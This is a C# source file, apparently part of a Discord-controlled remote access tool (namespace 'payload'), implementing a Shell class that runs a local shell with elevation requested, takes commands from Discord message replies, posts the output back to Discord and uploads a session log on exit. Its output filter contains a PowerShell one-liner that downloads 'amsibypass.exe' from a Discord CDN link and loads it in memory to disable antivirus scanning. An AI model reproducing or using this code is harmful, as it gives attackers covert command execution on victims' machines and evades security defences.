using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

using Discord.Rest;

using static payload.Globals;

namespace payload
{
    public class Shell
    {
        public RestUserMessage shmessage { get; set; }
        public Process shproc { get; set; }
        private List<string> log = new List<string>();
        private readonly Thread uThread;

        public Shell(RestUserMessage srcmsg)
        {
            shmessage = srcmsg;
            uThread = new Thread(() =>
            {
                while (true)
                {
                    if (log.Count > 0)
                    {
                        string text = string.Join("\n", log);
                        List<string> lines = new List<string>(text.Split('\n'));
                        while (lines.Count > 20) lines.RemoveAt(0);
                        string content = string.Join("\n", lines);
                        if (shmessage.Content != content)
                        {
                            shmessage.ModifyAsync((m) => { m.Content = "Reply to this message to input commands.\n```" + string.Join("\n", lines) + "```"; }).GetAwaiter().GetResult();
                        }
                    }
                    Thread.Sleep(500);
                }
            });
        }

        public void Start(string sname)
        {
            shellsInstances.Add(this);
            shproc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = sname,
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    Verb = "runas"
                }
            };
            shproc.EnableRaisingEvents = true;
            shproc.OutputDataReceived += OutputHandler;
            shproc.ErrorDataReceived += OutputHandler;
            shproc.Exited += ExitHandler;
            shproc.Start();
            shproc.BeginOutputReadLine();
            shproc.BeginErrorReadLine();
            uThread.Start();
        }

        public void SendCommand(string cmd) => shproc.StandardInput.WriteLine(cmd);

        private void ExitHandler(object sender, EventArgs e)
        {
            MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(string.Join("\n", log)));
            shmessage.Channel.SendFileAsync(memoryStream, "log.txt").GetAwaiter().GetResult();
            memoryStream.Dispose();
            uThread.Abort();
            shellsInstances.Remove(this);
        }

        private void OutputHandler(object sender, DataReceivedEventArgs e)
        {
            if (e.Data.Contains("$wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/969797235741175838/amsibypass.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, $null)")) return; 
            log.Add(e.Data);
        }
    }
}